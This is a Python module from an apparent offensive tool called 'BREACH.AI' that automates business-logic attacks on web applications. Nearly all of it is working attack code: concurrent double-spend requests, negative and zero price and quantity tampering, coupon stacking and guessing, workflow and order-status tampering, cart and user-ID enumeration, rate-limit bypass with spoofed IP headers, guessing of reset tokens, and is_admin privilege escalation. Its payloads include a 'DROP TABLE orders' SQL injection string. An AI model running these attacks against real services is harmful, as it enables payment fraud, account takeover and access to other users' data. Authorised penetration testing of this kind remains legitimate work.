"""
BREACH.AI - Business Logic Destroyer

Comprehensive business logic attack suite:
- Race Conditions (TOCTOU, double-spend)
- Price/Quantity Manipulation
- Workflow Bypass
- State Manipulation
- Feature Abuse
- Coupon/Discount Abuse
"""

import asyncio
import json
import re
import time
import urllib.parse
from dataclasses import dataclass, field
from decimal import Decimal
from typing import Any, Optional

from breach.attacks.base import AttackResult, BaseAttack
from breach.utils.logger import logger


@dataclass
class RaceConditionResult:
    """Result of race condition test."""
    vulnerable: bool
    race_type: str
    successful_races: int
    total_attempts: int
    evidence: dict


@dataclass
class PriceManipulationResult:
    """Result of price manipulation test."""
    vulnerable: bool
    original_price: float
    manipulated_price: float
    technique: str


class BusinessLogicDestroyer(BaseAttack):
    """
    BUSINESS LOGIC DESTROYER

    Annihilates business logic through:
    1. Race Conditions - TOCTOU, limit bypass, double-spend
    2. Price Manipulation - Negative values, overflow, rounding
    3. Workflow Bypass - Skip steps, reorder operations
    4. State Manipulation - Session state, cart manipulation
    5. Feature Abuse - Trial extension, referral abuse
    6. Coupon Abuse - Stacking, reuse, generation
    """

    attack_type = "business_logic"

    # Numeric manipulation values
    NUMERIC_PAYLOADS = [
        0,
        -1,
        -0.01,
        -999999,
        0.001,
        0.0001,
        99999999999,
        2147483647,      # INT_MAX
        2147483648,      # INT_MAX + 1
        -2147483648,     # INT_MIN
        -2147483649,     # INT_MIN - 1
        9999999999999999,
        1e308,           # Float max
        -1e308,          # Float min
        "NaN",
        "Infinity",
        "-Infinity",
        None,
        "",
        "0",
        "-0",
        "0.00",
        "00000001",
        "1.0000000000001",
        "0x7FFFFFFF",    # Hex INT_MAX
        "0xFFFFFFFF",    # Hex unsigned max
    ]

    # Price manipulation patterns
    PRICE_MANIPULATIONS = [
        ("negative", lambda p: -abs(p)),
        ("zero", lambda p: 0),
        ("tiny", lambda p: 0.01),
        ("overflow", lambda p: 99999999999),
        ("underflow", lambda p: -99999999999),
        ("rounding_down", lambda p: p - 0.009),
        ("rounding_up", lambda p: p + 0.009),
        ("scientific", lambda p: f"{p}e-10"),
        ("string_zero", lambda p: "0"),
        ("null", lambda p: None),
        ("empty", lambda p: ""),
    ]

    # Quantity manipulation
    QUANTITY_MANIPULATIONS = [
        0,
        -1,
        -100,
        0.5,
        0.1,
        99999,
        2147483647,
        None,
        "",
        "1; DROP TABLE orders--",
    ]

    async def run(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> Optional[AttackResult]:
        """
        Execute business logic attack suite.
        """
        findings = []

        # Determine attack surface from URL/context
        attack_context = self._analyze_context(url, kwargs)

        # Run all business logic attacks
        attack_tasks = []

        if attack_context.get("is_ecommerce"):
            attack_tasks.extend([
                self._attack_race_conditions(url, kwargs),
                self._attack_price_manipulation(url, kwargs),
                self._attack_quantity_manipulation(url, kwargs),
                self._attack_coupon_abuse(url, kwargs),
            ])

        if attack_context.get("is_auth"):
            attack_tasks.extend([
                self._attack_rate_limit_bypass(url, kwargs),
                self._attack_account_takeover_logic(url, kwargs),
            ])

        if attack_context.get("has_workflow"):
            attack_tasks.extend([
                self._attack_workflow_bypass(url, kwargs),
                self._attack_state_manipulation(url, kwargs),
            ])

        # Always run these
        attack_tasks.extend([
            self._attack_parameter_tampering(url, parameter, kwargs),
            self._attack_feature_abuse(url, kwargs),
            self._attack_idempotency_bypass(url, kwargs),
        ])

        results = await asyncio.gather(*attack_tasks, return_exceptions=True)

        for result in results:
            if isinstance(result, list):
                findings.extend(result)
            elif isinstance(result, dict) and result.get("vulnerable"):
                findings.append(result)

        if findings:
            # Sort by severity
            severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
            findings.sort(key=lambda x: severity_order.get(x.get("severity", "low"), 3))

            top_finding = findings[0]

            return AttackResult(
                success=True,
                attack_type=self.attack_type,
                endpoint=url,
                parameter=parameter,
                payload=str(top_finding.get("payload", "")),
                details=f"Business logic vulnerabilities: {len(findings)} issues",
                severity=top_finding.get("severity", "high"),
                evidence={
                    "findings": findings,
                    "total_issues": len(findings),
                    "attack_types": list(set(f.get("type") for f in findings)),
                },
            )

        return None

    def _analyze_context(self, url: str, kwargs: dict) -> dict:
        """Analyze URL to determine attack context."""
        url_lower = url.lower()

        return {
            "is_ecommerce": any(x in url_lower for x in [
                "cart", "checkout", "order", "payment", "buy", "purchase",
                "product", "shop", "store", "price", "basket", "item"
            ]),
            "is_auth": any(x in url_lower for x in [
                "login", "auth", "signin", "signup", "register", "password",
                "reset", "forgot", "verify", "confirm", "otp", "2fa", "mfa"
            ]),
            "has_workflow": any(x in url_lower for x in [
                "step", "wizard", "flow", "process", "stage", "phase",
                "submit", "confirm", "review", "finalize"
            ]),
            "is_api": "/api/" in url_lower or url_lower.endswith("/api"),
        }

    async def _attack_race_conditions(
        self,
        url: str,
        kwargs: dict
    ) -> list[dict]:
        """
        Test for race condition vulnerabilities.

        Attacks:
        - Double-spend / limit bypass
        - TOCTOU (Time of Check to Time of Use)
        - Concurrent request abuse
        """
        findings = []

        # Configuration
        concurrent_requests = kwargs.get("race_threads", 20)
        request_data = kwargs.get("data", {})
        method = kwargs.get("method", "POST")

        async def make_request():
            """Make a single request for race testing."""
            try:
                if method.upper() == "POST":
                    response = await self.http.post(url, json=request_data)
                else:
                    response = await self.http.get(url, params=request_data)
                return {
                    "status": response.status_code,
                    "body": response.text if hasattr(response, 'text') else str(response.body),
                    "time": time.time(),
                }
            except Exception as e:
                return {"error": str(e)}

        # Fire concurrent requests
        tasks = [make_request() for _ in range(concurrent_requests)]
        start_time = time.time()
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        end_time = time.time()

        # Analyze responses
        successful = [r for r in responses if isinstance(r, dict) and r.get("status") == 200]
        errors = [r for r in responses if isinstance(r, dict) and r.get("error")]

        # Check for race condition indicators
        if len(successful) > 1:
            # Multiple successful responses might indicate race condition
            unique_bodies = set(r.get("body", "")[:500] for r in successful)

            if len(unique_bodies) > 1:
                findings.append({
                    "type": "race_condition",
                    "vulnerable": True,
                    "race_type": "inconsistent_responses",
                    "severity": "high",
                    "successful_requests": len(successful),
                    "unique_responses": len(unique_bodies),
                    "total_requests": concurrent_requests,
                    "duration_ms": (end_time - start_time) * 1000,
                    "description": "Concurrent requests produced different results",
                })

            # Check for potential double-spend
            if self._detect_double_spend(successful):
                findings.append({
                    "type": "race_condition",
                    "vulnerable": True,
                    "race_type": "double_spend",
                    "severity": "critical",
                    "successful_requests": len(successful),
                    "impact": "Potential financial loss through double-spend",
                })

        # Test with slight delays (TOCTOU)
        toctou_results = await self._test_toctou(url, kwargs)
        if toctou_results:
            findings.extend(toctou_results)

        return findings

    async def _test_toctou(self, url: str, kwargs: dict) -> list[dict]:
        """Test for Time of Check to Time of Use vulnerabilities."""
        findings = []

        # This requires two endpoints - check and use
        check_url = kwargs.get("check_url", url)
        use_url = kwargs.get("use_url", url)

        if check_url == use_url:
            return findings

        async def check_and_use():
            """Perform check-then-use operation."""
            try:
                # Check
                await self.http.get(check_url)
                # Minimal delay
                await asyncio.sleep(0.001)
                # Use
                response = await self.http.post(use_url, json=kwargs.get("data", {}))
                return response.status_code
            except Exception:
                return None

        # Fire multiple check-and-use sequences simultaneously
        tasks = [check_and_use() for _ in range(10)]
        results = await asyncio.gather(*tasks)

        successful = [r for r in results if r == 200]
        if len(successful) > 1:
            findings.append({
                "type": "race_condition",
                "vulnerable": True,
                "race_type": "toctou",
                "severity": "high",
                "successful_operations": len(successful),
                "description": "Time of Check to Time of Use vulnerability",
            })

        return findings

    def _detect_double_spend(self, responses: list[dict]) -> bool:
        """Detect potential double-spend from responses."""
        # Look for success indicators in multiple responses
        success_indicators = ["success", "confirmed", "approved", "completed", "processed"]

        success_count = 0
        for response in responses:
            body = response.get("body", "").lower()
            if any(ind in body for ind in success_indicators):
                success_count += 1

        return success_count > 1

    async def _attack_price_manipulation(
        self,
        url: str,
        kwargs: dict
    ) -> list[dict]:
        """
        Test for price manipulation vulnerabilities.

        Attacks:
        - Negative prices
        - Zero prices
        - Decimal manipulation
        - Currency confusion
        - Overflow values
        """
        findings = []

        original_data = kwargs.get("data", {})
        price_fields = kwargs.get("price_fields", [
            "price", "amount", "total", "subtotal", "cost", "fee",
            "unit_price", "item_price", "shipping", "tax", "discount"
        ])

        for field in price_fields:
            original_price = original_data.get(field, 100.00)

            for manip_name, manip_func in self.PRICE_MANIPULATIONS:
                try:
                    manipulated_value = manip_func(float(original_price) if original_price else 100)
                except (ValueError, TypeError):
                    manipulated_value = manip_func(100)

                test_data = original_data.copy()
                test_data[field] = manipulated_value

                try:
                    response = await self.http.post(url, json=test_data)
                    body = response.text if hasattr(response, 'text') else str(response.body)

                    # Check if manipulation was accepted
                    if response.status_code == 200:
                        if self._check_price_accepted(body, manipulated_value):
                            findings.append({
                                "type": "price_manipulation",
                                "vulnerable": True,
                                "field": field,
                                "technique": manip_name,
                                "original_value": original_price,
                                "manipulated_value": manipulated_value,
                                "severity": "critical" if manip_name in ["negative", "zero"] else "high",
                                "impact": "Potential financial fraud",
                            })
                            break  # Found vuln for this field, move to next

                except Exception:
                    pass

        # Test client-side price in hidden fields
        try:
            response = await self.http.get(url)
            body = response.text if hasattr(response, 'text') else str(response.body)

            # Check for hidden price fields
            hidden_price_pattern = r'<input[^>]*type=["\']hidden["\'][^>]*(?:name|id)=["\'](?:price|amount|total)["\'][^>]*value=["\']([^"\']+)["\']'
            matches = re.findall(hidden_price_pattern, body, re.IGNORECASE)

            if matches:
                findings.append({
                    "type": "client_side_price",
                    "vulnerable": True,
                    "severity": "critical",
                    "hidden_prices": matches,
                    "description": "Price stored in client-side hidden field",
                    "impact": "Direct price manipulation possible",
                })
        except Exception:
            pass

        return findings

    def _check_price_accepted(self, body: str, value: Any) -> bool:
        """Check if manipulated price was accepted."""
        body_lower = body.lower()

        # Negative acceptance indicators
        if value and (isinstance(value, (int, float)) and value < 0):
            # Check if transaction went through with negative
            if "success" in body_lower or "confirmed" in body_lower:
                return True
            # Check for refund/credit indicators
            if "credit" in body_lower or "refund" in body_lower:
                return True

        # Zero price acceptance
        if value == 0 or value == "0":
            if "success" in body_lower and "error" not in body_lower:
                return True

        # General acceptance
        success_indicators = ["success", "order_id", "confirmation", "thank"]
        error_indicators = ["error", "invalid", "failed", "rejected"]

        has_success = any(ind in body_lower for ind in success_indicators)
        has_error = any(ind in body_lower for ind in error_indicators)

        return has_success and not has_error

    async def _attack_quantity_manipulation(
        self,
        url: str,
        kwargs: dict
    ) -> list[dict]:
        """
        Test for quantity manipulation vulnerabilities.
        """
        findings = []

        original_data = kwargs.get("data", {})
        qty_fields = kwargs.get("qty_fields", [
            "quantity", "qty", "count", "amount", "num", "items"
        ])

        for field in qty_fields:
            for manipulated_qty in self.QUANTITY_MANIPULATIONS:
                test_data = original_data.copy()
                test_data[field] = manipulated_qty

                try:
                    response = await self.http.post(url, json=test_data)
                    body = response.text if hasattr(response, 'text') else str(response.body)

                    if response.status_code == 200:
                        # Check for negative quantity acceptance
                        if manipulated_qty and isinstance(manipulated_qty, (int, float)) and manipulated_qty < 0:
                            if "success" in body.lower() or "added" in body.lower():
                                findings.append({
                                    "type": "quantity_manipulation",
                                    "vulnerable": True,
                                    "field": field,
                                    "value": manipulated_qty,
                                    "severity": "high",
                                    "impact": "Negative quantity may cause refund or credit",
                                })
                                break

                        # Check for zero quantity bypass
                        if manipulated_qty == 0:
                            if "success" in body.lower():
                                findings.append({
                                    "type": "quantity_bypass",
                                    "vulnerable": True,
                                    "field": field,
                                    "severity": "medium",
                                    "impact": "Zero quantity order possible",
                                })
                                break

                except Exception:
                    pass

        return findings

    async def _attack_coupon_abuse(
        self,
        url: str,
        kwargs: dict
    ) -> list[dict]:
        """
        Test for coupon/discount code abuse.

        Attacks:
        - Coupon stacking
        - Expired coupon reuse
        - Coupon code prediction
        - Multiple redemptions
        """
        findings = []

        coupon_url = kwargs.get("coupon_url", url)
        coupon_code = kwargs.get("coupon_code", "")
        coupon_field = kwargs.get("coupon_field", "coupon")

        # Test coupon stacking (multiple coupons)
        if coupon_code:
            stack_payloads = [
                f"{coupon_code},{coupon_code}",
                f"{coupon_code};{coupon_code}",
                [coupon_code, coupon_code],
                f"{coupon_code}\n{coupon_code}",
            ]

            for payload in stack_payloads:
                test_data = {coupon_field: payload}

                try:
                    response = await self.http.post(coupon_url, json=test_data)
                    body = response.text if hasattr(response, 'text') else str(response.body)

                    if response.status_code == 200 and "discount" in body.lower():
                        findings.append({
                            "type": "coupon_stacking",
                            "vulnerable": True,
                            "payload": str(payload),
                            "severity": "high",
                            "impact": "Multiple discounts can be applied",
                        })
                        break
                except Exception:
                    pass

        # Test common/predictable coupon codes
        common_coupons = [
            "TEST", "ADMIN", "DEBUG", "DEV", "EMPLOYEE", "STAFF",
            "100OFF", "50OFF", "FREE", "DISCOUNT", "PROMO",
            "SAVE100", "WELCOME", "FIRST", "NEW", "VIP",
            "BLACKFRIDAY", "CYBER", "XMAS", "HOLIDAY",
        ]

        for code in common_coupons:
            test_data = {coupon_field: code}

            try:
                response = await self.http.post(coupon_url, json=test_data)
                body = response.text if hasattr(response, 'text') else str(response.body)

                if response.status_code == 200:
                    if "success" in body.lower() or "applied" in body.lower():
                        findings.append({
                            "type": "predictable_coupon",
                            "vulnerable": True,
                            "coupon": code,
                            "severity": "medium",
                            "impact": "Predictable coupon code accepted",
                        })
            except Exception:
                pass

        # Test negative discount values
        negative_discounts = ["-100", "-50", -100, -99999]

        for discount in negative_discounts:
            test_data = {"discount": discount, "discount_percent": discount}

            try:
                response = await self.http.post(coupon_url, json=test_data)
                body = response.text if hasattr(response, 'text') else str(response.body)

                if response.status_code == 200 and "error" not in body.lower():
                    findings.append({
                        "type": "negative_discount",
                        "vulnerable": True,
                        "value": discount,
                        "severity": "critical",
                        "impact": "Negative discount increases price for others or credits self",
                    })
                    break
            except Exception:
                pass

        return findings

    async def _attack_workflow_bypass(
        self,
        url: str,
        kwargs: dict
    ) -> list[dict]:
        """
        Test for workflow bypass vulnerabilities.

        Attacks:
        - Skip steps
        - Access final step directly
        - Modify step order
        """
        findings = []

        # Get workflow configuration
        steps = kwargs.get("workflow_steps", [])
        final_step_url = kwargs.get("final_step_url", "")

        # Try to access final step directly
        if final_step_url:
            try:
                response = await self.http.get(final_step_url)

                if response.status_code == 200:
                    body = response.text if hasattr(response, 'text') else str(response.body)

                    # Check if we bypassed workflow
                    if "error" not in body.lower() and "unauthorized" not in body.lower():
                        findings.append({
                            "type": "workflow_bypass",
                            "vulnerable": True,
                            "bypassed_step": "final",
                            "severity": "high",
                            "description": "Final step accessible without completing workflow",
                        })
            except Exception:
                pass

        # Test step parameter manipulation
        step_params = ["step", "stage", "phase", "state", "flow"]

        for param in step_params:
            # Try to jump to final step
            for final_value in ["final", "complete", "done", "finish", "99", "999"]:
                test_url = f"{url}?{param}={final_value}"

                try:
                    response = await self.http.get(test_url)

                    if response.status_code == 200:
                        body = response.text if hasattr(response, 'text') else str(response.body)

                        # Check for successful bypass
                        success_indicators = ["complete", "success", "confirm", "thank"]
                        if any(ind in body.lower() for ind in success_indicators):
                            findings.append({
                                "type": "step_bypass",
                                "vulnerable": True,
                                "parameter": param,
                                "value": final_value,
                                "severity": "high",
                            })
                            break
                except Exception:
                    pass

        # Test going backwards in workflow
        if steps:
            for i, step_url in enumerate(steps[1:], 1):
                # After completing step i, try to go back to step 0
                try:
                    response = await self.http.get(steps[0])
                    if response.status_code == 200:
                        findings.append({
                            "type": "workflow_regression",
                            "vulnerable": True,
                            "severity": "medium",
                            "description": "Can return to previous steps after advancing",
                        })
                        break
                except Exception:
                    pass

        return findings

    async def _attack_state_manipulation(
        self,
        url: str,
        kwargs: dict
    ) -> list[dict]:
        """
        Test for state manipulation vulnerabilities.

        Attacks:
        - Cart manipulation
        - Session state tampering
        - Order state changes
        """
        findings = []

        # Test order status manipulation
        status_values = [
            "completed", "shipped", "delivered", "refunded",
            "cancelled", "paid", "approved", "verified"
        ]

        status_fields = ["status", "order_status", "state", "order_state"]

        for field in status_fields:
            for status in status_values:
                test_data = {field: status}

                try:
                    response = await self.http.post(url, json=test_data)
                    body = response.text if hasattr(response, 'text') else str(response.body)

                    if response.status_code == 200:
                        if status in body.lower() or "success" in body.lower():
                            findings.append({
                                "type": "state_manipulation",
                                "vulnerable": True,
                                "field": field,
                                "value": status,
                                "severity": "critical",
                                "impact": f"Order state can be changed to '{status}'",
                            })
                            break
                except Exception:
                    pass

        # Test cart ID manipulation (access other users' carts)
        cart_fields = ["cart_id", "cartId", "basket_id", "session_id"]

        for field in cart_fields:
            # Try sequential IDs
            for test_id in ["1", "2", "100", "admin", "test"]:
                test_url = f"{url}?{field}={test_id}"

                try:
                    response = await self.http.get(test_url)
                    body = response.text if hasattr(response, 'text') else str(response.body)

                    if response.status_code == 200:
                        # Check if we got someone else's cart
                        if "item" in body.lower() or "product" in body.lower():
                            findings.append({
                                "type": "cart_takeover",
                                "vulnerable": True,
                                "field": field,
                                "test_id": test_id,
                                "severity": "high",
                                "impact": "Can access other users' carts",
                            })
                            break
                except Exception:
                    pass

        return findings

    async def _attack_rate_limit_bypass(
        self,
        url: str,
        kwargs: dict
    ) -> list[dict]:
        """
        Test for rate limit bypass.
        """
        findings = []

        # Bypass techniques
        bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Host": "localhost"},
            {"True-Client-IP": "127.0.0.1"},
            {"CF-Connecting-IP": "127.0.0.1"},
        ]

        # First, trigger rate limit
        triggered = False
        for i in range(100):
            try:
                response = await self.http.post(url, json=kwargs.get("data", {}))
                if response.status_code == 429:
                    triggered = True
                    break
            except Exception:
                pass

        if not triggered:
            return findings

        # Now try to bypass
        for bypass_header in bypass_headers:
            try:
                response = await self.http.post(
                    url,
                    json=kwargs.get("data", {}),
                    headers=bypass_header
                )

                if response.status_code != 429:
                    findings.append({
                        "type": "rate_limit_bypass",
                        "vulnerable": True,
                        "bypass_header": list(bypass_header.keys())[0],
                        "severity": "medium",
                        "impact": "Rate limiting can be bypassed",
                    })
                    break
            except Exception:
                pass

        # Test case variation bypass
        test_data = kwargs.get("data", {})
        if "email" in test_data:
            variations = [
                test_data["email"].upper(),
                test_data["email"].lower(),
                test_data["email"].replace("@", "+bypass@"),
                test_data["email"].replace(".", ".."),
            ]

            for variation in variations:
                var_data = test_data.copy()
                var_data["email"] = variation

                try:
                    response = await self.http.post(url, json=var_data)

                    if response.status_code != 429:
                        findings.append({
                            "type": "rate_limit_bypass",
                            "vulnerable": True,
                            "technique": "email_variation",
                            "variation": variation,
                            "severity": "medium",
                        })
                        break
                except Exception:
                    pass

        return findings

    async def _attack_account_takeover_logic(
        self,
        url: str,
        kwargs: dict
    ) -> list[dict]:
        """
        Test for account takeover through logic flaws.
        """
        findings = []

        # Test password reset token prediction
        reset_url = kwargs.get("reset_url", url)

        # Test sequential tokens
        for token in ["1", "123", "000001", "admin123"]:
            test_url = f"{reset_url}?token={token}"

            try:
                response = await self.http.get(test_url)
                body = response.text if hasattr(response, 'text') else str(response.body)

                if response.status_code == 200:
                    if "password" in body.lower() and "invalid" not in body.lower():
                        findings.append({
                            "type": "predictable_reset_token",
                            "vulnerable": True,
                            "token": token,
                            "severity": "critical",
                            "impact": "Password reset tokens are predictable",
                        })
                        break
            except Exception:
                pass

        # Test user enumeration via timing
        existing_user = kwargs.get("existing_user", "admin")
        fake_user = kwargs.get("fake_user", "definitely_not_a_real_user_12345")

        timings = {"existing": [], "fake": []}

        for _ in range(5):
            # Time existing user
            start = time.time()
            try:
                await self.http.post(url, json={"username": existing_user})
            except Exception:
                pass
            timings["existing"].append(time.time() - start)

            # Time fake user
            start = time.time()
            try:
                await self.http.post(url, json={"username": fake_user})
            except Exception:
                pass
            timings["fake"].append(time.time() - start)

        avg_existing = sum(timings["existing"]) / len(timings["existing"])
        avg_fake = sum(timings["fake"]) / len(timings["fake"])

        # If there's a significant timing difference
        if abs(avg_existing - avg_fake) > 0.1:
            findings.append({
                "type": "timing_user_enumeration",
                "vulnerable": True,
                "severity": "low",
                "existing_user_avg": avg_existing,
                "fake_user_avg": avg_fake,
                "impact": "User existence can be determined via timing",
            })

        return findings

    async def _attack_parameter_tampering(
        self,
        url: str,
        parameter: Optional[str],
        kwargs: dict
    ) -> list[dict]:
        """
        Test for parameter tampering vulnerabilities.
        """
        findings = []

        original_data = kwargs.get("data", {})

        # Test user ID manipulation
        id_fields = ["user_id", "userId", "uid", "account_id", "owner_id"]

        for field in id_fields:
            if field in original_data:
                original_value = original_data[field]

                # Try other user IDs
                test_ids = ["1", "2", "admin", "0", "-1", str(int(original_value) + 1) if original_value.isdigit() else "1"]

                for test_id in test_ids:
                    test_data = original_data.copy()
                    test_data[field] = test_id

                    try:
                        response = await self.http.post(url, json=test_data)
                        body = response.text if hasattr(response, 'text') else str(response.body)

                        if response.status_code == 200 and "unauthorized" not in body.lower():
                            findings.append({
                                "type": "idor",
                                "vulnerable": True,
                                "field": field,
                                "original": original_value,
                                "tampered": test_id,
                                "severity": "high",
                                "impact": "Can access/modify other users' data",
                            })
                            break
                    except Exception:
                        pass

        # Test boolean parameter manipulation
        bool_fields = ["is_admin", "isAdmin", "admin", "verified", "premium", "paid"]

        for field in bool_fields:
            for value in [True, "true", "1", "yes"]:
                test_data = original_data.copy()
                test_data[field] = value

                try:
                    response = await self.http.post(url, json=test_data)
                    body = response.text if hasattr(response, 'text') else str(response.body)

                    if response.status_code == 200:
                        if "admin" in body.lower() or "premium" in body.lower():
                            findings.append({
                                "type": "privilege_escalation",
                                "vulnerable": True,
                                "field": field,
                                "value": value,
                                "severity": "critical",
                                "impact": "Privilege escalation via parameter manipulation",
                            })
                            break
                except Exception:
                    pass

        return findings

    async def _attack_feature_abuse(
        self,
        url: str,
        kwargs: dict
    ) -> list[dict]:
        """
        Test for feature abuse vulnerabilities.

        - Referral abuse
        - Trial extension
        - Resource exhaustion
        """
        findings = []

        # Test self-referral
        referral_url = kwargs.get("referral_url", "")
        if referral_url:
            try:
                # Try to refer self
                user_id = kwargs.get("user_id", "1")
                response = await self.http.post(
                    referral_url,
                    json={"referrer": user_id, "referred": user_id}
                )

                if response.status_code == 200:
                    body = response.text if hasattr(response, 'text') else str(response.body)
                    if "success" in body.lower() or "credit" in body.lower():
                        findings.append({
                            "type": "self_referral",
                            "vulnerable": True,
                            "severity": "medium",
                            "impact": "Can earn referral credits by referring self",
                        })
            except Exception:
                pass

        # Test trial extension
        trial_fields = ["trial_end", "trial_expires", "subscription_end", "expires_at"]

        for field in trial_fields:
            future_date = "2099-12-31T23:59:59Z"
            test_data = {field: future_date}

            try:
                response = await self.http.post(url, json=test_data)

                if response.status_code == 200:
                    findings.append({
                        "type": "trial_extension",
                        "vulnerable": True,
                        "field": field,
                        "severity": "high",
                        "impact": "Trial/subscription can be extended indefinitely",
                    })
                    break
            except Exception:
                pass

        return findings

    async def _attack_idempotency_bypass(
        self,
        url: str,
        kwargs: dict
    ) -> list[dict]:
        """
        Test for idempotency key bypass.

        Allows replaying transactions.
        """
        findings = []

        original_data = kwargs.get("data", {})

        # Test without idempotency key
        idempotency_fields = [
            "idempotency_key", "idempotencyKey", "request_id", "requestId",
            "transaction_id", "nonce", "x-idempotency-key"
        ]

        # Remove idempotency key and send multiple times
        test_data = {k: v for k, v in original_data.items() if k.lower() not in [f.lower() for f in idempotency_fields]}

        success_count = 0
        for _ in range(3):
            try:
                response = await self.http.post(url, json=test_data)

                if response.status_code == 200:
                    success_count += 1
            except Exception:
                pass

        if success_count > 1:
            findings.append({
                "type": "idempotency_bypass",
                "vulnerable": True,
                "successful_replays": success_count,
                "severity": "high",
                "impact": "Same transaction can be processed multiple times",
            })

        # Test with same idempotency key
        for field in idempotency_fields:
            test_data = original_data.copy()
            test_data[field] = "same-key-123"

            success_count = 0
            for _ in range(3):
                try:
                    response = await self.http.post(url, json=test_data)

                    if response.status_code == 200:
                        success_count += 1
                except Exception:
                    pass

            if success_count > 1:
                findings.append({
                    "type": "idempotency_not_enforced",
                    "vulnerable": True,
                    "field": field,
                    "successful_with_same_key": success_count,
                    "severity": "high",
                })
                break

        return findings


class RaceConditionAttack(BaseAttack):
    """Focused race condition testing."""

    attack_type = "race_condition"

    async def run(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "POST",
        **kwargs
    ) -> Optional[AttackResult]:
        """Run race condition tests."""
        destroyer = BusinessLogicDestroyer(self.http)
        findings = await destroyer._attack_race_conditions(url, kwargs)

        if findings:
            return AttackResult(
                success=True,
                attack_type=self.attack_type,
                endpoint=url,
                parameter=parameter,
                details=f"Race condition found: {findings[0].get('race_type', 'unknown')}",
                severity="high",
                evidence={"findings": findings},
            )
        return None


class PriceManipulationAttack(BaseAttack):
    """Focused price manipulation testing."""

    attack_type = "price_manipulation"

    async def run(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "POST",
        **kwargs
    ) -> Optional[AttackResult]:
        """Run price manipulation tests."""
        destroyer = BusinessLogicDestroyer(self.http)
        findings = await destroyer._attack_price_manipulation(url, kwargs)

        if findings:
            return AttackResult(
                success=True,
                attack_type=self.attack_type,
                endpoint=url,
                parameter=parameter,
                payload=str(findings[0].get("manipulated_value", "")),
                details=f"Price manipulation: {findings[0].get('technique', '')}",
                severity="critical",
                evidence={"findings": findings},
            )
        return None


async def destroy_business_logic(
    target_url: str,
    http_client: Any = None,
    **kwargs
) -> dict:
    """
    Convenience function to run full business logic attack suite.

    Args:
        target_url: Target URL
        http_client: HTTP client instance
        **kwargs: Additional configuration

    Returns:
        Dictionary with all findings
    """
    from breach.utils.http import HTTPClient

    client = http_client or HTTPClient(base_url=target_url)
    own_client = http_client is None

    try:
        destroyer = BusinessLogicDestroyer(client)
        result = await destroyer.run(target_url, **kwargs)

        return {
            "success": result is not None and result.success,
            "findings": result.evidence if result else {},
            "target": target_url,
        }
    finally:
        if own_client:
            await client.close()
